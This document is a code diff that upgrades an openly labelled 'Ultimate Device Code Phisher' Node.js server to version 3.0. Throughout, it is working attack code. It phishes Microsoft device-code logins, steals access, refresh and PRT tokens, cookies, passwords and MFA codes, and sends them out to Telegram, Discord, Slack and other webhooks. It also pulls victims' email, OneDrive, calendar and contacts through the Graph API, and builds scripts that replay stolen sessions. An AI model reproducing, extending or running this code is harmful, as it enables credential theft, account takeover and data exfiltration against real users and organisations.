@@ -1,8 +1,13 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v2.2 – Static HTML files
+// 🥔 ULTIMATE DEVICE CODE PHISHER v3.0 – All Features
 // ============================================================
-// Now serves dashboard from public/index.html and device page
-// from public/device_code.html.
+// Includes: Device Code, Auto-Refresh, Multi-Tenant, PRT,
+// Dashboard, Graph Email/OneDrive/Calendar/Contacts Exfil,
+// IP Geolocation, Second-Stage Phishing with MFA,
+// Multi-Service, Session Replay with Cookies, WebSocket,
+// Health Check, Multi-Channel Exfil, Anti-Bot, Custom Redirect,
+// QR Code, Fingerprinting, Token Export ZIP, Manual Exchange,
+// Polling Fallback, Session Cleanup.
 // ============================================================
 
 const http = require('http');
@@ -18,22 +23,27 @@ const WebSocket = require('ws');
 const QRCode = require('qrcode');
 const express = require('express');
 const basicAuth = require('express-basic-auth');
+const AdmZip = require('adm-zip');
 
 // ── Environment ──
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
+const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
+const DINGTALK_WEBHOOK = process.env.DINGTALK_WEBHOOK || '';
+const MATTERMOST_WEBHOOK = process.env.MATTERMOST_WEBHOOK || '';
+const GENERIC_WEBHOOK = process.env.GENERIC_WEBHOOK || '';
 const SMTP_HOST = process.env.SMTP_HOST || '';
 const SMTP_PORT = process.env.SMTP_PORT || 587;
 const SMTP_USER = process.env.SMTP_USER || '';
 const SMTP_PASS = process.env.SMTP_PASS || '';
-const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
 const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
 const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
 const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const SCOPE = 'https://graph.microsoft.com/.default offline_access';
+const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000; // 7 days
 
 // ── Storage ──
 const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
@@ -53,6 +63,18 @@ function loadFlows() {
 function saveFlows() {
     fs.writeFileSync(FLOWS_FILE, JSON.stringify(flows, null, 2));
 }
+
+// ── Session Cleanup ──
+function cleanupSessions() {
+    const now = Date.now();
+    const before = flows.length;
+    flows = flows.filter(f => (now - new Date(f.created).getTime()) < SESSION_TTL);
+    if (flows.length !== before) {
+        saveFlows();
+        console.log(`🧹 Cleaned ${before - flows.length} expired sessions.`);
+    }
+}
+setInterval(cleanupSessions, 60 * 60 * 1000); // hourly
 
 // ── Helpers ──
 function generateSessionId() {
@@ -111,7 +133,7 @@ async function getGeo(ip) {
 
 // ── Multi‑Channel Exfil ──
 async function exfiltrate(data) {
-    const { email, tokens, sessionId, ip, userAgent, tenantId, prt } = data;
+    const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint } = data;
     const geo = await getGeo(ip);
     let message = `🔐 **Device Code Capture!**\n\n`;
     message += `🆔 Session: ${sessionId}\n`;
@@ -119,93 +141,108 @@ async function exfiltrate(data) {
     message += `🏢 Tenant: ${tenantId || 'N/A'}\n`;
     message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
     message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
+    message += `📱 Fingerprint: ${fingerprint || 'N/A'}\n`;
     message += `🕒 Time: ${new Date().toISOString()}\n\n`;
     if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
     if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
     if (tokens.id_token) message += `🆔 ID: ${tokens.id_token.slice(0,30)}...\n`;
     if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
+    if (cookies && cookies.length) message += `🍪 Cookies: ${cookies.length} captured\n`;
 
-    // Telegram
-    if (BOT_TOKEN && CHAT_ID) {
-        try {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            }, { timeout: 5000 });
-            // Send file
-            if (tokens.access_token || tokens.refresh_token || tokens.id_token || prt) {
-                let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
-                if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
-                if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
-                if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
-                if (prt) fileText += `PRT:\n${prt}\n\n`;
-                const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
-                fs.writeFileSync(tmpFile, fileText);
-                const form = new FormData();
-                form.append('chat_id', CHAT_ID);
-                form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
-                    headers: form.getHeaders(),
-                    timeout: 10000
-                });
-                fs.unlinkSync(tmpFile);
-            }
-        } catch (e) { console.warn('Telegram exfil failed:', e.message); }
+    // Send to all configured channels
+    const webhooks = [
+        { url: BOT_TOKEN && CHAT_ID ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null, method: 'post', payload: { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true } },
+        { url: DISCORD_WEBHOOK, method: 'post', payload: { content: message.substring(0, 2000) } },
+        { url: SLACK_WEBHOOK, method: 'post', payload: { text: message } },
+        { url: DINGTALK_WEBHOOK, method: 'post', payload: { msgtype: 'text', text: { content: message } } },
+        { url: MATTERMOST_WEBHOOK, method: 'post', payload: { text: message } },
+        { url: GENERIC_WEBHOOK, method: 'post', payload: { text: message } }
+    ];
+
+    for (const hook of webhooks) {
+        if (hook.url) {
+            try {
+                await axios[hook.method](hook.url, hook.payload, { timeout: 5000 });
+            } catch (e) { /* silent */ }
+        }
     }
 
-    // Discord
-    if (DISCORD_WEBHOOK) {
+    // Telegram file attachment (if tokens)
+    if (BOT_TOKEN && CHAT_ID && (tokens.access_token || tokens.refresh_token || tokens.id_token || prt)) {
         try {
-            await axios.post(DISCORD_WEBHOOK, {
-                content: message.substring(0, 2000)
-            }, { timeout: 5000 });
-        } catch (e) { console.warn('Discord exfil failed:', e.message); }
-    }
-
-    // Slack
-    if (SLACK_WEBHOOK) {
-        try {
-            await axios.post(SLACK_WEBHOOK, {
-                text: message
-            }, { timeout: 5000 });
-        } catch (e) { console.warn('Slack exfil failed:', e.message); }
+            let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
+            if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
+            if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
+            if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
+            if (prt) fileText += `PRT:\n${prt}\n\n`;
+            if (cookies && cookies.length) fileText += `COOKIES:\n${cookies.join('\n')}\n\n`;
+            const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
+            fs.writeFileSync(tmpFile, fileText);
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+                headers: form.getHeaders(),
+                timeout: 10000
+            });
+            fs.unlinkSync(tmpFile);
+        } catch (e) { console.warn('Telegram file exfil failed:', e.message); }
     }
 
     console.log(`✅ Exfiltrated session ${sessionId}`);
 }
 
-// ── Graph Email Exfil ──
-async function exfilEmails(accessToken, sessionId) {
-    try {
-        const resp = await axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=20&$select=subject,from,receivedDateTime', {
-            headers: { Authorization: `Bearer ${accessToken}` },
-            timeout: 10000
-        });
-        const emails = resp.data.value || [];
-        if (emails.length === 0) return;
-        let txt = `# Email Dump - Session ${sessionId}\n\n`;
-        emails.forEach((e, i) => {
-            txt += `--- Email ${i+1} ---\n`;
-            txt += `Subject: ${e.subject || 'N/A'}\n`;
-            txt += `From: ${e.from?.emailAddress?.address || 'N/A'}\n`;
-            txt += `Date: ${e.receivedDateTime || 'N/A'}\n\n`;
-        });
-        const tmpFile = path.join(__dirname, `emails_${sessionId}.txt`);
-        fs.writeFileSync(tmpFile, txt);
+// ── Graph API Deep Exfil ──
+async function exfilGraphData(accessToken, sessionId) {
+    const endpoints = {
+        emails: '/me/messages?$top=20&$select=subject,from,receivedDateTime',
+        files: '/me/drive/root/children?$top=10&$select=name,size,webUrl',
+        calendar: '/me/calendar/events?$top=10&$select=subject,start,end',
+        contacts: '/me/contacts?$top=10&$select=displayName,emailAddresses'
+    };
+    const results = {};
+    for (const [key, endpoint] of Object.entries(endpoints)) {
+        try {
+            const resp = await axios.get(`https://graph.microsoft.com/v1.0${endpoint}`, {
+                headers: { Authorization: `Bearer ${accessToken}` },
+                timeout: 10000
+            });
+            results[key] = resp.data.value || [];
+        } catch (e) { results[key] = []; }
+    }
+
+    // Create a ZIP file with all data
+    const zip = new AdmZip();
+    for (const [key, items] of Object.entries(results)) {
+        if (items.length) {
+            let txt = `# ${key.toUpperCase()} - Session ${sessionId}\n\n`;
+            items.forEach((item, i) => {
+                txt += `--- ${key} ${i+1} ---\n`;
+                txt += JSON.stringify(item, null, 2) + '\n\n';
+            });
+            zip.addFile(`${key}.txt`, Buffer.from(txt));
+        }
+    }
+    if (zip.getEntries().length === 0) return;
+
+    const zipPath = path.join(__dirname, `graph_${sessionId}.zip`);
+    zip.writeZip(zipPath);
+
+    // Send via Telegram (if configured)
+    if (BOT_TOKEN && CHAT_ID) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('document', fs.createReadStream(tmpFile), { filename: `emails_${sessionId}.txt` });
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
-            headers: form.getHeaders(),
-            timeout: 10000
-        });
-        fs.unlinkSync(tmpFile);
-        console.log(`📧 Emails exfiltrated for session ${sessionId}`);
-    } catch (e) {
-        console.warn('Email exfil failed:', e.message);
+        form.append('document', fs.createReadStream(zipPath), { filename: `graph_${sessionId}.zip` });
+        form.append('caption', `📁 Graph data for session ${sessionId}`);
+        try {
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+                headers: form.getHeaders(),
+                timeout: 30000
+            });
+        } catch (e) { console.warn('Graph ZIP exfil failed:', e.message); }
     }
+    fs.unlinkSync(zipPath);
+    console.log(`📦 Graph data exfiltrated for session ${sessionId}`);
 }
 
 // ── Token Health Check ──
@@ -252,8 +289,6 @@ setInterval(refreshTokens, 60 * 60 * 1000); // every hour
 // ── Express App ──
 const app = express();
 app.use(express.json());
-
-// Serve static files from 'public' directory
 app.use(express.static('public'));
 
 // Health
@@ -305,7 +340,9 @@ app.post('/device/request', async (req, res) => {
             client_id: clientId,
             session_id: generateSessionId(),
             service: service,
-            tenant: 'organizations'
+            tenant: 'organizations',
+            cookies: [],
+            fingerprint: null
         };
         flows.push(flow);
         saveFlows();
@@ -347,7 +384,6 @@ app.post('/device/token', async (req, res) => {
                 if (payload.prt) prt = payload.prt;
             } catch (e) {}
         }
-        // Extract PRT if present in response (some Microsoft flows return it)
         if (tokens.prt) prt = tokens.prt;
 
         flow.status = 'approved';
@@ -369,12 +405,14 @@ app.post('/device/token', async (req, res) => {
             prt,
             ip,
             userAgent: req.headers['user-agent'],
-            tenantId
+            tenantId,
+            cookies: flow.cookies || [],
+            fingerprint: flow.fingerprint
         });
 
-        // Trigger email exfil if access token available
+        // Trigger Graph exfil if access token available
         if (tokens.access_token) {
-            setTimeout(() => exfilEmails(tokens.access_token, flow.session_id), 10000);
+            setTimeout(() => exfilGraphData(tokens.access_token, flow.session_id), 15000);
         }
 
         // Broadcast via WebSocket
@@ -393,7 +431,20 @@ app.post('/device/token', async (req, res) => {
     }
 });
 
-// ── Second‑Stage Phishing (Fake Login) ──
+// ── Fingerprint & Cookie capture ──
+app.post('/device/fingerprint', (req, res) => {
+    const { sessionId, fingerprint, cookies } = req.body;
+    const flow = flows.find(f => f.session_id === sessionId);
+    if (flow) {
+        flow.fingerprint = fingerprint;
+        flow.cookies = cookies || [];
+        saveFlows();
+        console.log(`🖐️ Fingerprint & cookies stored for ${sessionId}`);
+    }
+    res.json({ success: true });
+});
+
+// ── Second‑Stage Phishing (Fake Login with MFA) ──
 app.get('/login', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -415,6 +466,7 @@ app.get('/login', (req, res) => {
         <form id="loginForm">
             <input type="email" id="email" placeholder="Email or phone" required>
             <input type="password" id="password" placeholder="Password" required>
+            <input type="text" id="mfa" placeholder="Verification code (optional)">
             <button type="submit">Sign in</button>
         </form>
     </div>
@@ -423,10 +475,11 @@ app.get('/login', (req, res) => {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
+            const mfa = document.getElementById('mfa').value;
             await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
+                body: JSON.stringify({ email, password, mfa })
             });
             window.location.href = '${REDIRECT_URL}';
         });
@@ -437,9 +490,8 @@ app.get('/login', (req, res) => {
 });
 
 app.post('/capture', async (req, res) => {
-    const { email, password } = req.body;
-    console.log(`📥 Second‑stage capture: ${email} / ${password}`);
-    // Exfiltrate via all channels
+    const { email, password, mfa } = req.body;
+    console.log(`📥 Second‑stage capture: ${email} / ${password} / MFA: ${mfa || 'N/A'}`);
     await exfiltrate({
         sessionId: 'second_stage',
         email,
@@ -455,9 +507,9 @@ app.use('/dash', basicAuth({
     users: { [DASHBOARD_USER]: DASHBOARD_PASS },
     challenge: true
 }));
-// The dashboard is now served from public/index.html via static middleware
+// Static HTML served from public/index.html
 
-// ── API endpoints for dashboard ──
+// ── API endpoints ──
 app.get('/api/flows', (req, res) => {
     res.json(flows);
 });
@@ -468,17 +520,73 @@ app.get('/api/flow/:sessionId', (req, res) => {
     res.json(flow);
 });
 
-app.post('/api/replay/:sessionId', (req, res) => {
+// Manual token exchange
+app.post('/api/exchange/:sessionId', async (req, res) => {
     const flow = flows.find(f => f.session_id === req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
-    // Build a replay script that injects stored cookies (if any)
+    if (!flow.refresh_token) return res.status(400).json({ error: 'no refresh token' });
+    try {
+        const tenant = flow.tenant || 'organizations';
+        const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
+            new URLSearchParams({
+                client_id: flow.client_id || CLIENT_ID,
+                refresh_token: flow.refresh_token,
+                grant_type: 'refresh_token',
+                scope: SCOPE
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        flow.access_token = resp.data.access_token;
+        if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
+        flow.last_refresh = new Date().toISOString();
+        saveFlows();
+        res.json({ success: true, new_access_token: flow.access_token });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Export all as ZIP
+app.get('/api/export', (req, res) => {
+    const zip = new AdmZip();
+    // Add flows JSON
+    zip.addFile('flows.json', Buffer.from(JSON.stringify(flows, null, 2)));
+    // Add each session's tokens as a separate file
+    flows.forEach(f => {
+        if (f.access_token || f.refresh_token || f.id_token || f.prt) {
+            let txt = `Session: ${f.session_id}\nEmail: ${f.username || 'Unknown'}\nCreated: ${f.created}\n\n`;
+            if (f.access_token) txt += `ACCESS_TOKEN:\n${f.access_token}\n\n`;
+            if (f.refresh_token) txt += `REFRESH_TOKEN:\n${f.refresh_token}\n\n`;
+            if (f.id_token) txt += `ID_TOKEN:\n${f.id_token}\n\n`;
+            if (f.prt) txt += `PRT:\n${f.prt}\n\n`;
+            if (f.cookies && f.cookies.length) txt += `COOKIES:\n${f.cookies.join('\n')}\n\n`;
+            zip.addFile(`session_${f.session_id}.txt`, Buffer.from(txt));
+        }
+    });
+    const zipBuffer = zip.toBuffer();
+    res.setHeader('Content-Type', 'application/zip');
+    res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
+    res.send(zipBuffer);
+});
+
+// Replay endpoint with cookies
+app.get('/api/replay/:sessionId', (req, res) => {
+    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    if (!flow) return res.status(404).json({ error: 'not found' });
+    const cookies = flow.cookies || [];
+    const token = flow.access_token || '';
     const script = `
     (function() {
-        const token = '${flow.access_token || ''}';
+        const cookies = ${JSON.stringify(cookies)};
+        const token = '${token}';
+        cookies.forEach(c => {
+            document.cookie = c + '; path=/; domain=login.microsoftonline.com; Secure; SameSite=None';
+        });
         if (token) {
             localStorage.setItem('access_token', token);
-            alert('Token injected. You can now use it.');
         }
+        alert('Cookies and token injected. You can now login.');
+        window.location.href = 'https://login.microsoftonline.com';
     })();
     `;
     res.json({ replayScript: script });
@@ -528,7 +636,7 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v3.0 running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device_code.html`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
